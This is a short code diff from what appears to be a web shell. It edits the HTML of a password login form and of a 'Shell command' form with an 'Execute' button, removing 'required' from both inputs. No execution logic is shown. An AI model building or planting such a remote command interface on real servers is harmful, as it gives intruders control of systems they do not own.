@@ -27,7 +27,7 @@ function SHOW_SHELL_HTML() {
     </head>
     <body>
       <form method="post">
-        <input type="text" name="data" placeholder="Shell command" required>
+        <input type="text" name="data" placeholder="Shell command">
         <input type="button" name="btn" value="Execute">
       </form>
     </body>
@@ -44,7 +44,7 @@ function SHOW_LOGIN_HTML() {
     </head>
     <body>
       <form method="post">
-        <input type="password" name="data" placeholder="Password" required>
+        <input type="password" name="data" placeholder="Password">
         <input type="button" name="btn" value="Sign in">
     </body>
   </html>
